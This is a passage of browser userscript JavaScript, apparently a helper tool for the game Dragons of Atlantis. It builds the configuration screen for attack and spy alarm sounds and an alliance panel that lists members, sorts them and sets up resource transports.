				city_id   : Seed.cities[0].id,
				defended  : !Seed.cities[0].defended,
				onSuccess : function (){
					// Change again when recibe the real state from cityUpdate
					button.disabled = false;
					button.className = UID[ (Seed.cities[0].defended ? 'btn_off' : 'btn_on') ];
					button.value = translate( Seed.cities[0].defended ? 'Defend' : 'Hiding' ).toUpperCase();
				},
				onFailure : function() { 
					var state = Seed.cities[0].defended;
					button.disabled = false;
					button.className = UID[ (state ? 'btn_off' : 'btn_on') ];
					button.value = translate( state ? 'Defend' : 'Hiding' ).toUpperCase();
				},
				delay     : 500,
				caller    : 'Tabs.Sentinel.tabWall.changeWall'
			});
		}

	},

	//*** Sentinel Tab - Config Sub-Tab ***
	//----------------------------------------------------------------------------
	tabOptions : function ()
	{
		var t = Tabs.Sentinel;
		
		var repeat_unit = ['','',''];
		
		switch ( Data.options.sentinel.time_repeat.unit )
		{
			case 60:    repeat_unit[0] = 'selected';  break;
			case 3600:  repeat_unit[1] = 'selected';  break;
			default:    repeat_unit[0] = 'selected';
		}

		var keep_unit = ['','',''];
		
		switch ( Data.options.sentinel.msg_keeping.unit )
		{
			case 86400:  keep_unit[0] = 'selected';  break;
			default:    keep_unit[0] = 'selected';
		}

		var html = 
		 '<div class=' + UID['title'] + '>'+ translate('Sentinel Configuration') + '</div>'
		+'<table class=' + UID['table'] + '>'
		+'	<tr>'
		+'		<td><input id='+ setUID('Tabs.Sentinel.tabOptions.delete_message') +' '+ (Data.options.sentinel.delete_message?'CHECKED ':'') +' type=checkbox /></td>'
		+'		<td>'+ translate('Delete message after') +' :&nbsp;</td>'
		+'		<td align=left>'
		+'			<input id=' + setUID('Tabs.Sentinel.tabOptions.msg_keeping_delay') + ' size=1 maxlength=2 type=text value="' 
		+ 				Data.options.sentinel.msg_keeping.delay + '">'
		+'			</input>'
		+'			<select id=' + setUID('Tabs.Sentinel.tabOptions.msg_keeping_unit') + ' size=1>'
		+'				<option value=86400 ' + keep_unit[0] + '>' + translate('Days') + '</option>'
		+'			</select>'
		+'		</td>'
		+'	</tr>'
		+'</table>'
		+'<table class=' + UID['table'] + ' width=100%>'
		+'	<th colspan=4>'+translate('Alarm Configuration')+'</th>'
		+'	<tr>'
		+'		<td><input id='+ setUID('Tabs.Sentinel.tabOptions.disable_all_alarm') +' '+ (Data.options.sound.disable_sentinel?'CHECKED ':'') +' type=checkbox /></td>'
		+'		<td align=left colspan=2>'+ translate('Disable all alarm') +'</td>'
		+'		<td width=75%></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td><input id='+ setUID('Tabs.Sentinel.tabOptions.disable_spy_alarm') +' '+ (Data.options.sentinel.disable_spy_alarm?'CHECKED ':'') +' type=checkbox /></td>'
		+'		<td align=left colspan=2>'+ translate('Disable alarm for spy alert') +'</td>'
		+'		<td width=75%></td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td><input id='+ setUID('Tabs.Sentinel.tabOptions.repeat_alarm') +' '+ (Data.options.sentinel.repeat_alarm?'CHECKED ':'') +' type=checkbox /></td>'
		+'		<td align=left>'+ translate('Repeat alarm during') +' :</td>'
		+'		<td align=left>'
		+'			<input id=' + setUID('Tabs.Sentinel.tabOptions.time_repeat_delay') + ' size=1 maxlength=2 type=text value="' 
		+ 				Data.options.sentinel.time_repeat.delay + '">'
		+'			</input>'
		+'			<select id=' + setUID('Tabs.Sentinel.tabOptions.time_repeat_unit') + ' size=1>'
		+'				<option value=60 ' + repeat_unit[0] + '>' + translate('Minutes') + '</option>'
		+'				<option value=3600 ' + repeat_unit[1] + '>' + translate('Hours') + '</option>'
		+'			</select>'
		+'		</td>'
		+'		<td width=75%></td>'
		+'	</tr>'
		+'</table>'
		+'<table class=' + UID['table'] + ' width=100%>'
		+'	<th colspan=10>'+translate('Sound File Configuration')+'</th>'
		+'	<tr>'
		+'		<td align=right>'+ translate('File for Spy alarm') +' :</td>'
		+'		<td>'
		+'			<input id=' + setUID('Tabs.Sentinel.tabOptions.File_Spy_Sound') + ' size=50 maxlength=160 type=text style="text-align:left;" value="' + Data.options.sound.URL_sentinel_1 + '">'
		+'			</input>'
		+'		</td>'
		+'		<td>'
		+'			<input type=image id=' + setUID('Tabs.Sentinel.tabOptions.Play_Spy_Sound') + ' class="'+ UID['doa-icons'] + ' i-play '+ UID['bnt_image_green']+'" value="" title="Play">'
		+'			</input>'
		+'			<input type=image id=' + setUID('Tabs.Sentinel.tabOptions.Stop_Spy_Sound') + ' class="'+ UID['doa-icons'] + ' i-stop '+ UID['bnt_image_green']+'" value="" title="Stop">'
		+'			</input>'
		+'			<input type=image id=' + setUID('Tabs.Sentinel.tabOptions.Default_Spy_Sound') + ' class="'+ UID['doa-icons'] + ' i-Default '+ UID['bnt_image_green']+'" value="" title="Default">'
		+'			</input>'
		+'		</td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td align=right>'+ translate('File for Attack alarm') +' :</td>'
		+'		<td>'
		+'			<input id=' + setUID('Tabs.Sentinel.tabOptions.File_Attack_Sound') + ' size=50 maxlength=160 type=text style="text-align:left;" value="' + Data.options.sound.URL_sentinel_2 + '">'
		+'			</input>'
		+'		</td>'
		+'		<td>'
		+'			<input type=image id=' + setUID('Tabs.Sentinel.tabOptions.Play_Attack_Sound') + ' class="'+ UID['doa-icons'] + ' i-play '+ UID['bnt_image_green']+'" value="" title="Play">'
		+'			</input>'
		+'			<input type=image id=' + setUID('Tabs.Sentinel.tabOptions.Stop_Attack_Sound') + ' class="'+ UID['doa-icons'] + ' i-stop '+ UID['bnt_image_green']+'" value="" title="Stop">'
		+'			</input>'
		+'			<input type=image id=' + setUID('Tabs.Sentinel.tabOptions.Default_Attack_Sound') + ' class="'+ UID['doa-icons'] + ' i-Default '+ UID['bnt_image_green']+'" value="" title="Default">'
		+'			</input>'
		+'		</td>'
		+'	</tr>'
		+'</table>';
		
		$J('#'+UID['Tabs.Sentinel.content']).html( html );

		// Add event listeners
		$J('#'+UID['Tabs.Sentinel.tabOptions.disable_all_alarm']).change(function ( event ) {
			Data.options.sound.disable_sentinel = event.target.checked;
		});
		
		$J('#'+UID['Tabs.Sentinel.tabOptions.disable_spy_alarm']).change(function ( event ) {
			Data.options.sentinel.disable_spy_alarm = event.target.checked;
		});
		
		$J('#'+UID['Tabs.Sentinel.tabOptions.repeat_alarm']).change(function ( event ) {
			Data.options.sentinel.repeat_alarm = event.target.checked;
		});
		
		$J('#'+UID['Tabs.Sentinel.tabOptions.delete_message']).change(function ( event ) {
			Data.options.sentinel.delete_message = event.target.checked;
			if (Data.options.sentinel.delete_message) {
				Sentinel.del_report_timer=setInterval(Sentinel.deletetick,300000);
			} else {
				clearTimeout(Sentinel.del_report_timer); Sentinel.del_report_timer = null;
			}
		});
		
		$J('#'+UID['Tabs.Sentinel.tabOptions.time_repeat_delay']).change ( function ( event) {
			var time = parseIntZero( $J(this).val() );
			Data.options.sentinel.time_repeat.delay = time;
		});
		
		$J('#'+UID['Tabs.Sentinel.tabOptions.time_repeat_unit']).change ( function ( event ) {
			Data.options.sentinel.time_repeat.unit = parseIntZero( $J(this).val() );
		});
				
		$J('#'+UID['Tabs.Sentinel.tabOptions.msg_keeping_delay']).change ( function ( event) {
			var time = parseIntZero( $J(this).val() );
			Data.options.sentinel.msg_keeping.delay = time;
		});
		
		$J('#'+UID['Tabs.Sentinel.tabOptions.msg_keeping_unit']).change ( function ( event ) {
			Data.options.sentinel.msg_keeping.unit = parseIntZero( $J(this).val() );
		});

		$J('#'+UID['Tabs.Sentinel.tabOptions.File_Spy_Sound']).change ( function ( event ) {
			Data.options.sound.URL_sentinel_1 = $J(this).val();
		});

		$J('#'+UID['Tabs.Sentinel.tabOptions.File_Attack_Sound']).change ( function ( event ) {
			Data.options.sound.URL_sentinel_2 = $J(this).val();
		});

		$J('#'+UID['Tabs.Sentinel.tabOptions.Play_Spy_Sound']).click ( function () {
			if (Sentinel.alert_level == 0) {
				var file=$J('#'+UID['Tabs.Sentinel.tabOptions.File_Spy_Sound']).val();
				Sound.PlaySound('sentinel_1',false,file);
			}
		});

		$J('#'+UID['Tabs.Sentinel.tabOptions.Play_Attack_Sound']).click ( function () {
			if (Sentinel.alert_level == 0) {
				var file=$J('#'+UID['Tabs.Sentinel.tabOptions.File_Attack_Sound']).val();
				Sound.PlaySound('sentinel_2',false,file);
			}
		});

		$J('#'+UID['Tabs.Sentinel.tabOptions.Stop_Spy_Sound']).click ( function () {
			if (Sentinel.alert_level == 0) {
				Sound.StopSound('sentinel_1');
			}
		});

		$J('#'+UID['Tabs.Sentinel.tabOptions.Stop_Attack_Sound']).click ( function () {
			if (Sentinel.alert_level == 0) {
				Sound.StopSound('sentinel_2');
			}
		});

		$J('#'+UID['Tabs.Sentinel.tabOptions.Default_Spy_Sound']).click ( function () {
			Data.options.sound.URL_sentinel_1=Sound.DEFAULT_SOUND_URL.sentinel_1;
			$J('#'+UID['Tabs.Sentinel.tabOptions.File_Spy_Sound']).val(Data.options.sound.URL_sentinel_1);
		});

		$J('#'+UID['Tabs.Sentinel.tabOptions.Default_Attack_Sound']).click ( function () {
			Data.options.sound.URL_sentinel_2=Sound.DEFAULT_SOUND_URL.sentinel_2;
			$J('#'+UID['Tabs.Sentinel.tabOptions.File_Attack_Sound']).val(Data.options.sound.URL_sentinel_2);
		});

	}
	
};
//******************************** End Sentinel *************************

// *********************************** Alliance features Tab ****************************************
Tabs.Alliance = {
	tab_order		   : ALLIANCE_TAB_ORDER,
	tab_label		   : 'Alliance',
	tab_disabled	 : !ALLIANCE_TAB_ENABLE,
	
	container		   : null,
	current_tab		 : 0, // 0 = summary, 1 = train, 2 = build, 3 = research
	last_tab_id		 : 'tabSummary',

	totalResources : 0,
	maxResources   : 0,
	totalForces    : 0,
	recallTimer    : 0,
	own			       : 0,
	my_role		     : 'none',
	autoTimer	     : null,
	marchTimer	   : null,
	autoErrors	   : 0,
	report_num     : -1,
	last_report	   : null,
  sorted_memberships : [],
  
 	transport		: {
		timer	: {
			auto_trsp  :null,
			trsp_table : null
		},
		errors		: 0,
		error_delay : 60000,
		current_city: 0,
		current_troop: 0,
		inProgress : false,
	},

	running			: {
		errors			: 0
	},
	
	timers 			: {
		resources : null,
		troops : null
	},
	
	table_output : {},

	transport_unit_types          : Units.transport_unit_types,

  all_resource_types				    : Resources.resources_type,
  normaly_resource_types	      : Resources.transportable_resource_types,
  transportable_resource_types	: Resources.transportable_resource_types,


	init : function (div) {
		var t = Tabs.Alliance;
		
		t.own = Seed.player.alliance ? Seed.player.alliance.id : -1;
		t.my_role = Seed.player.alliance_membership ? Seed.player.alliance_membership.role : 'none';
		
		if (t.new_id == 0) t.new_id  = Seed.player.alliance.id;
		
		if (Data.options.cheat.blue_energy) {
			t.transportable_resource_types =  t.all_resource_types.cloneProps();
		} else {
			t.transportable_resource_types = t.normaly_resource_types.cloneProps();
		}

		t.container = div;
		var html = 
		 '<div id=' + setUID('Tabs.Alliance.title') + ' class=' + UID['title'] + '>' + translate('Alliance features') + '</div>'
		+'<div class=' + UID['status_ticker'] + ' id='+ setUID('Tabs.Alliance.status') +' style="margin-bottom:5px !important">'
		+'</div>'
		+'<ul class=tabs>'
		+'	<li class="tab first"><a id=' + setUID('Tabs.Alliance.tabMembers')        + '><span class="' + UID['doa-icons'] + ' i-Members"></span>' + translate('Members')        + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Alliance.tabActivity')       + '><span class="' + UID['doa-icons'] + ' i-Activity"></span>' + translate('Activity')       + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Alliance.tabTransport')      + '><span class="' + UID['doa-icons'] + ' i-PackDragon"></span>' + translate('Transport')      + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Alliance.tabReinforcements') + '><span class="' + UID['doa-icons'] + ' i-Reinforcement"></span>' + translate('Reinforcements') + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Alliance.tabAlliances')      + '><span class="' + UID['doa-icons'] + ' i-Alliances"></span>' + translate('Alliances') + '</a></li>'
		+'</ul>'
		+'<div id='+ setUID('Tabs.Alliance.content') +' style="padding-top:0px; height:655px; ; max-height:655px; overflow-y:auto"></div>';

		$J( t.container ).html( html );
		
		// Add the event listeners
		$J( '#'+UID['Tabs.Alliance.tabMembers']       ).click ( {current_tab:0}, t.showSubTab );
		$J( '#'+UID['Tabs.Alliance.tabActivity']      ).click ( {current_tab:1}, t.showSubTab );
		$J( '#'+UID['Tabs.Alliance.tabTransport']     ).click ( {current_tab:2}, t.showSubTab );
		$J( '#'+UID['Tabs.Alliance.tabReinforcements']).click ( {current_tab:3}, t.showSubTab );
		$J( '#'+UID['Tabs.Alliance.tabAlliances']     ).click ( {current_tab:4}, t.showSubTab );

		// Add the unload event listener
		window.addEventListener('unload', t.onUnload, false);

		t.setTrspEnable ( Data.options.alliance.auto_trsp.enabled );
				
		setTimeout (t.plansTick, 1000);  // modify by Didi


	},


	show : function (){
		var t = Tabs.Alliance;
		t.showSubTab ( {data:{ current_tab: Data.options.alliance.current_tab }} );
	},

	showSubTab : function( event )
	{
		var t = Tabs.Alliance;
		
		t.clearTimerTicks();
		
		var current_tab = event.data.current_tab;
		
		Data.options.alliance.current_tab = current_tab;
		
		t.current_tab = current_tab;

		var tab_name;
		switch ( current_tab )
		{
		case 0: tab_name = 'tabMembers'  ; break;
		case 1: tab_name = 'tabActivity'    ; break;
		case 2: tab_name = 'tabTransport'    ; break;
		case 3: tab_name = 'tabReinforcements' ; break;
		case 4: tab_name = 'tabAlliances' ; break;
		}
		
		$J('#'+UID[t.last_tab_id])
		.css('z-index', '0')
		.removeClass('selected');
		
		$J('#'+UID['Tabs.Alliance.' + tab_name])
		.css('z-index', '1')
		.addClass('selected');
		
		t.last_tab_id = 'Tabs.Alliance.' + tab_name;
		
		if (Data.options.cheat.blue_energy) {
			t.transportable_resource_types = t.all_resource_types.cloneProps();
		} else {
			t.transportable_resource_types = t.normaly_resource_types.cloneProps();
		}
		
		t[tab_name] ();
	},

	onUnload : function (){
		var t = Tabs.Alliance;
	},

	clearTimerTicks : function()
	{
		var t = Tabs.Alliance;
		// clear all Timer Ticks
		clearTimeout ( t.timers.resources ); t.timers.resources=null;
		clearTimeout ( t.timers.troops ); t.timers.troops=null;

	},

	hide : function (){
		var t = Tabs.Alliance;
		t.clearTimerTicks();
		
	},

	refreshList : function (){
		var t = Tabs.Alliance;
		if (t.checkMembersBusy) return false;
		t.checkMembersBusy = true;
		t.getAllianceMembers(function(r){

			Tabs.Alliance.checkMembersBusy = false

			var now = serverTime();
			Data.options.alliance.last_update = new Date(now * 1000).myString();
			t.show ();
		});
	},

	getAllianceMembers : function (notify){
		var t = Tabs.Alliance;
		Data.dynamic.players.memberships_evolution = [];
		
		var dialogbox = dialogBox({
			id		 : setUID('dialog-refreshmember'),
			minWidth : 400,
			centerTo : t.container,
			buttons  : [],
			overlay  : true,
			title	 : translate('Message'),
			html	 : '<center>' +  translate ('Search for alliance members') + '</center>'
		});

		if ( !Seed.player.alliance || !Seed.player.alliance.id ) {
			Data.dynamic.players.memberships = [];

			dialogbox.html('<B>' + translate('Your not in alliance') + '.</B>');
			
			dialogbox.centerTo();
			dialogbox.buttons([
				{
					text: translate('Accept'),
					click: function() { 
						dialogbox.destroy();
					}
				}
			]);
			if (notify) notify(false);
			return ;
		}
		Data.dynamic.players.memberships_evolution = [];
		if (Data.dynamic.players.memberships && Data.dynamic.players.memberships != undefined && Data.dynamic.players.memberships.length > 0) {
			Data.dynamic.players.memberships_evolution = Data.dynamic.players.memberships.cloneProps();
		}

		Data.dynamic.players.memberships = [];

		MyAjax.members_alliance ({
			alliance_id : Seed.player.alliance.id,
			
			onSuccess : function( r ) {
				var obj = r.cloneProps();
				//Didi : delete some properties
				for (var a=0; a<obj.member.length; a++) {
					delete obj.member[a].approved;
					delete obj.member[a].source;
					delete obj.member[a].created_at;
					delete obj.member[a].id;
					if (obj.member[a].player) {
						delete obj.member[a].player.type;
						delete obj.member[a].player.race;
						delete obj.member[a].player.level;
						if (obj.member[a].player.city) {
							delete obj.member[a].player.city.type;
							delete obj.member[a].player.city.id;
							obj.member[a].dist=Map.getDistance(Seed.cities[0].x, Seed.cities[0].y, obj.member[a].player.city.x, obj.member[a].player.city.y);
						}
					}
				}
				
				delete obj.done;
				delete obj.page;
				delete obj.total;

				$J.merge(Data.dynamic.players.memberships, obj.member);
				
				dialogbox.destroy();
				if (notify) notify(true);
			},
				
			onFailure : function( r ) {
				if ( r !== null && r.error ) {
					dialogbox.html( r.error );
				} else {
					dialogbox.html('<B>' + translate('Error while retrieving the list of members') + '.</B>');
				}
				
				dialogbox.centerTo();
				dialogbox.buttons([
					{
						text: translate('Accept'),
						click: function() { 
							dialogbox.destroy();
						}
					}
				]);
				if (notify) notify(false);
			},
			
			caller : 'Tabs.Alliance.getAllianceMembers'
				
		});

	},

	//** ALLIANCE MEMBERS LIST SUB-TAB ***
	tabMembers : function (){
		var t = Tabs.Alliance;

		if (!Data.options.alliance.sort_list ||
			Data.options.alliance.sort_list == null ||
			Data.options.alliance.sort_list == undefined)
			Data.options.alliance.sort_list = '0';
		if (Data.options.alliance.last_update &&
			Data.options.alliance.last_update != null &&
			Data.options.alliance.last_update != undefined)
			kLastupdate = ' ('+Data.options.alliance.last_update+')';
		else kLastupdate = '';

		var html = 
			 '<div id=' + setUID('Tabs.Alliance.tabMembers.Results') + ' style="height:640px">'
			+'	<div class=' + UID['title'] + '>' + translate('Members list ') + kLastupdate + '</div>'
			+'	<div style="margin-bottom:5px !important">'
			+'		<input type=button value="' + translate('Refresh list') + '" id='+ setUID('Tabs.Alliance.tabMembers.refreshList') +' />'
			+'	</div>'
			+'	<div id=' + setUID('Tabs.Alliance.tabMembers.content') + ' style="height:620px; max-height:620px; overflow:auto; white-space:nowrap; margin-top:1px !important"></div>'
			+'	</div>';

		$J( '#'+UID['Tabs.Alliance.content'] )
		.css ( {
			'height'		: '670px',
			'margin-top'	: '9px',
			'overflow'      : 'hidden'
		})
		.html(html); 

		$J('#'+UID['Tabs.Alliance.tabMembers.refreshList']).click ( t.refreshList );

		var $content = $J( '#'+UID['Tabs.Alliance.tabMembers.content'] );

		var html =
		   '<table class="' + UID['table'] + ' zebra" style="width:100%;">'
			+'	<tr>'
			+'		<th id=' + setUID('Tabs.Alliance.tabMembers.tal_0') + ' width="40px"><A><span>' + translate('Dist') + '</span></A></th>'
			+'		<th id=' + setUID('Tabs.Alliance.tabMembers.tal_1') + ' width="55px"><A><span>' + translate('Coords') + '</span></A></th>'
			+'		<th id=' + setUID('Tabs.Alliance.tabMembers.tal_2') + ' width="150px"><A><span>' + translate('Player name') + '</span></A></th>'
			+'		<th id=' + setUID('Tabs.Alliance.tabMembers.tal_3') + ' width="65px"><A><span>' + translate('Role') + '</span></A></th>'
			+'		<th id=' + setUID('Tabs.Alliance.tabMembers.tal_4') + ' width="65px" align=right><A><span>' + translate('Might') + '</span></A></th>'
			+'		<th width="60px" align=right><A><span>' + translate('Evol') + '</span></A></th>'
			+'		<th id=' + setUID('Tabs.Alliance.tabMembers.tal_5') + ' width="65px" align=right><A><span>' + translate('Joined') + '</span></A></th>'
			+'	</tr>';

		t.sorted_memberships = [];
		for (var i=0; i<Data.dynamic.players.memberships.length; i++){
			var found = false;
			var evol = 'x';
			var member = Data.dynamic.players.memberships[i].cloneProps();
			for (var old=0; old<Data.dynamic.players.memberships_evolution.length && !found; old++){
				var old_member = Data.dynamic.players.memberships_evolution[old];
				if (Data.dynamic.players.memberships_evolution[old].player.id == Data.dynamic.players.memberships[i].player.id){
					evol = (member.player ? member.player.might ||0 : 0) - (old_member.player ? old_member.player.might || 0 : 0 );
					found = true;
					member.evol = evol;
					member.newm = false;
					member.dismiss = false;
					t.sorted_memberships.push (member);
				}
			}
			if (!found) {
				member.evol = 'x';
				member.newm = true;
				member.dismiss = false;
				t.sorted_memberships.push (member);
			}
		}
		for (var old=0; old<Data.dynamic.players.memberships_evolution.length; old++){
			var found = false;
			var member = Data.dynamic.players.memberships_evolution[old].cloneProps();
			for (var i=0; i<Data.dynamic.players.memberships.length && !found; i++){
				if (Data.dynamic.players.memberships_evolution[old].player.id == Data.dynamic.players.memberships[i].player.id)
					found = true;
			}
			if (!found && member.player) {
				member.evol = '-';
				member.newm = false;
				member.dismiss = true;
				t.sorted_memberships.push (member);
			}
		}
		
		sortMembList ();
		
		for (var i=0; i<t.sorted_memberships.length; i++){
			var fontC = 'black';
			var fontC_evol = 'black';
			var member = t.sorted_memberships[i];
			if ( member.newm ) {
				fontC = 'green';
			  fontC_evol = 'green';
			}
			if ( member.dismiss ) {
				fontC = 'red';
			  fontC_evol = 'red';
			}
			html += 
			 '  <tr>'
			+'    <td>' + ((member.dist||0).toString()).fontcolor(fontC) + '</td>'
			+'	  <td align=center>' + ((member.player ? (member.player.city ? member.player.city.x : '') : '') +','+ (member.player ? (member.player.city ? member.player.city.y : '') : '')).fontcolor(fontC) + '</td>';
			var mightF = (member.player ? parseInt(member.player.might||0).intToCommas() : '');
			var evol = member.evol;
			if (!member.newm && !member.dismiss) {
				if (evol < 0) {
					evol = parseInt(evol).intToCommas();
					fontC_evol='red';
				}
				else if (evol > 0) {
					evol = '+'+parseInt(evol).intToCommas();
					fontC_evol='green';
				}
				else evol = parseInt(evol).intToCommas();
			}

			if (member.role == 'vassal') var pRole = '';
			else var pRole = translate( 'role-' + member.role );
			html +=
			 '    <td align=left>' + (member.player ? (member.player.name ? member.player.name.fontcolor(fontC): ''):'') + '</td>'
			+'	  <td align=left>' + pRole.fontcolor(fontC) + '</td>'
			+'	  <td align=right>' + mightF.fontcolor(fontC) + '</td>'
			+'	  <td align=right>' + evol.fontcolor(fontC_evol) + '</td>'
			+'	  <td align=right>' + $J.datepicker.formatDate('dd/mm/yy', new Date((member.created_at_i||0)*1000)).fontcolor(fontC) + '</td>'
			+'  </tr>';
		}
		
		html +=
				 '</table>';
		$content.html( html );
		//$content.addClass( UID['scrollable'] );

		for (var h=0; h<6; h++) {
			$J( '#'+UID['Tabs.Alliance.tabMembers.tal_' + h]       ).click ( {sort_tal:h}, Change_sortMembList );
		}

		function sortMembList () {
			switch ( Data.options.alliance.sort_list ) {
			case '0' :
				t.sorted_memberships.sort(function(a,b){return b.dist-a.dist});
				break;
			case '-0' :
				t.sorted_memberships.sort(function(a,b){return a.dist-b.dist});
				break;
			case '1' :
				t.sorted_memberships.sort(function(a,b){return (b.player.city ? b.player.city.x : 0)-(a.player.city ? a.player.city.x : 0)});
				break;
      case '-1' :
				t.sorted_memberships.sort(function(a,b){return (a.player.city ? a.player.city.x : 0)-(b.player.city ? b.player.city.x : 0)});
				break;
			case '2' :
				t.sorted_memberships.sort(function(a, b){a = (a.player.name||'').toLowerCase(); b = (b.player.name||'').toLowerCase(); if (a>b) return -1; if (a <b) return 1; return 0;});
				break;
			case '-2' :
				t.sorted_memberships.sort(function(a, b){a = (a.player.name||'').toLowerCase(); b = (b.player.name||'').toLowerCase(); if (a>b) return 1; if (a <b) return -1; return 0;});
				break;
			case '3' :
				t.sorted_memberships.sort(function(a, b){a = a.role.toLowerCase(); b = b.role.toLowerCase(); if (a>b) return -1; if (a <b) return 1; return 0;});
				break;
			case '-3' :
				t.sorted_memberships.sort(function(a, b){a = a.role.toLowerCase(); b = b.role.toLowerCase(); if (a>b) return 1; if (a <b) return -1; return 0;});
				break;
			case '4' :
				t.sorted_memberships.sort(function(a,b){return (b.player ? b.player.might||0 : 0)-(a.player ? a.player.might||0 : 0)});
				break;
			case '-4' :
				t.sorted_memberships.sort(function(a,b){return (a.player ? a.player.might||0 : 0)-(b.player ? b.player.might||0 : 0)});
				break;
			case '5' :
				t.sorted_memberships.sort(function(a,b){return b.created_at_i-a.created_at_i});
				break;
			case '-5' :
				t.sorted_memberships.sort(function(a,b){return a.created_at_i-b.created_at_i});
				break;
			}
		}
		
		function Change_sortMembList (event){
			var t = Tabs.Alliance;
					
			var sort_tal = event.data.sort_tal;

			switch ( sort_tal ) {
			case 0 :
				if (Data.options.alliance.sort_list == '0'){
					Data.options.alliance.sort_list = '-0';
				} else {
					Data.options.alliance.sort_list = '0';
				}
				break;
			case 1 :
				if (Data.options.alliance.sort_list == '1'){
					Data.options.alliance.sort_list = '-1';
				} else {
					Data.options.alliance.sort_list = '1';
				}
				break;
			case 2 :
				if (Data.options.alliance.sort_list == '2'){
					Data.options.alliance.sort_list = '-2';
				} else {
					Data.options.alliance.sort_list = '2';
				}
				break;
			case 3 :
				if (Data.options.alliance.sort_list == '3'){
					Data.options.alliance.sort_list = '-3';
				} else {
					Data.options.alliance.sort_list = '3';
				}
				break;
			case 4 :
				if (Data.options.alliance.sort_list == '4'){
					Data.options.alliance.sort_list = '-4';
				} else {
					Data.options.alliance.sort_list = '4';
				}
				break;
			case 5 :
				if (Data.options.alliance.sort_list == '5'){
					Data.options.alliance.sort_list = '-5';
				} else {
					Data.options.alliance.sort_list = '5';
				}
				break;
			}
			t.tabMembers();
		}
	},

	//** ALLIANCE TRANSPORT SUB-TAB ***
	tabTransport : function (){
		var t = Tabs.Alliance;

		var html = 
		   '<div id=' + setUID('Tabs.Alliance.tabTransport.Results') + ' style="height:590px">'
			+'	<div class=' + UID['title'] + '>' + translate('Send resources') + '</div>'
			+'	<div id=' + setUID('Tabs.Alliance.tabTransport.Status') + ' style="margin-bottom:5px !important">'
			+'	<table class="' + UID['table'] + ' zebra" width=100%>'
			+'		<tr align=left>'
			+'			<th align=left colspan=3>' + translate ('Recipient') + ' : </th>'
			+'		</tr>'
			+'    <tr>'
			+'			<td width=25%><div id=' + setUID('Tabs.Alliance.tabTransport.TransPlayerList') + '></div></td>'
			+'			<td width=60%><div id=' + setUID('Tabs.Alliance.tabTransport.TransTarget') + ' style="height: 17px; padding: 2px 0px;"></div></td>'
			+'			<td width=15%>'
			+'				<input id=' + setUID('Tabs.Alliance.tabTransport.RefreshMember') + ' type=button class="'+UID['bnt_green']+'" value="' + translate('Refresh Members') + '" />'
			+'			</td>'
			+'		</tr>'
			+'	</table><br>'
			+'	<table id=' + setUID('Tabs.Alliance.tabTransport.TTroops') + ' class="' + UID['table'] + ' zebra" width=100%>'
			+'		<tr align=left>'
			+'			<th colspan=10>'+ translate('Troops for transport') +':&nbsp;</th>'
			+'		</tr>'
			+'	</table><br>'
			+'	<table id=' + setUID('Tabs.Alliance.tabTransport.Resources') + ' class="' + UID['table'] + ' zebra" width=100%>'
			+'		<tr align=left>'
			+'			<th width=100% colspan=6>'+ translate('Resources to transport') +':&nbsp;</th>'
			+'		</tr>';

		for (var p=0; p<t.transportable_resource_types.length; p++){
			var num = parseIntZero(Data.options.alliance.data.resources[t.transportable_resource_types[p]]);
			var actualStock = parseIntZero(Seed.cities[0].resources[t.transportable_resource_types[p]] || 0);

			var remaining = '( ' + parseInt(actualStock - num).intToCommas() +' )';
			actualStock = parseInt(actualStock).intToCommas();

			html +=
			 '		<tr>'
			+'		  <td align=right class=right width=20%>'
			+ 		    translate(t.transportable_resource_types[p].replace(/_/,' ')) + ' '
			+'		  	<span class="' + UID['doa-icons'] + ' i-' + t.transportable_resource_types[p] + '" ></span>'			
			+'		     &nbsp:'
			+'		  </td>'
			+'			<td width=20%>'
			+'				<input type=text id=' + setUID('Tabs.Alliance.tabTransport.Res_' + t.transportable_resource_types[p]) +' ref=' + t.transportable_resource_types[p] + ' maxlength=10 style="width:70px" size=2 value="'+ num +'"\></td>'
			+'			<td width=5%>'
			+'				<input class=small id=' + setUID('Tabs.Alliance.tabTransport.Zero_' + t.transportable_resource_types[p]) +' ref=' + t.transportable_resource_types[p] + ' type=button style="width:auto !important;" value=" Min " \></td>'
			+'			<td width=5%>'
			+'				<input class=small id=' + setUID('Tabs.Alliance.tabTransport.Max_' + t.transportable_resource_types[p]) +' ref=' + t.transportable_resource_types[p] + ' type=button style="width:auto !important;" value=" Max " \></td>'
			+'			<td align=right width=25%><span id=' + setUID('Tabs.Alliance.tabTransport.Stk_' + t.transportable_resource_types[p]) +' ref=' + t.transportable_resource_types[p] + '>'+ actualStock +'</span></td>'
			+'			<td align=right width=25%><span id=' + setUID('Tabs.Alliance.tabTransport.Rem_' + t.transportable_resource_types[p]) +' ref=' + t.transportable_resource_types[p] + '>'+ remaining +'</span></td>'
			//+'		  <td></td>'
			+'		</tr>';
		}
		
		var sel_Unit = ['','',''];
		
		switch ( Data.options.alliance.auto_trsp.unit )
		{
			case 60:    sel_Unit[0] = 'selected';  break;
			case 3600:  sel_Unit[1] = 'selected';  break;
			case 86400: sel_Unit[2] = 'selected';  break;
			default:    sel_Unit[1] = 'selected';
		}

		html += 
		 '	  <tr>'
		+'	    <td align=right class=right>' + translate ('Load capacity') + '&nbsp:</td>'
		+'			<td colspan=5 align=left><div id=' + setUID('Tabs.Alliance.tabTransport.Total') + '></div></td>'
		+'		</tr>'
		+'	  <tr>'
		+'			<td align=left width=10%><label><input id=' + setUID('Tabs.Alliance.tabTransport.AjustTrsp') + ' type=button class="'+UID['bnt_green']+'" value="' + translate('Ajust Number') + '" /></label></td>'
		+'			<td colspan=5 align=right width=90%><label><input id=' + setUID('Tabs.Alliance.tabTransport.clearAll') + ' type=button class="'+UID['bnt_green']+'" value="' + translate('Clear all') + '" /></label></td>'
		+'		</tr>'
		+'	</table><br>'
		+'	<table class=' + UID['table'] + ' style="margin-top:3px" width=100%>'
		+'		<tr valign=top>'
		+'			<td align=left width=10%><label><input id=' + setUID('Tabs.Alliance.tabTransport.Launch') + ' type=button value="' + translate('Send transport') + '" /></label></td>'
		+'			<td align=right width=80%>'
		+'	      <input id=' + setUID('Tabs.Alliance.tabTransport.AddPlan') + ' type=button value="' + translate('Plan transport') + '" >'
		+'				</input>'
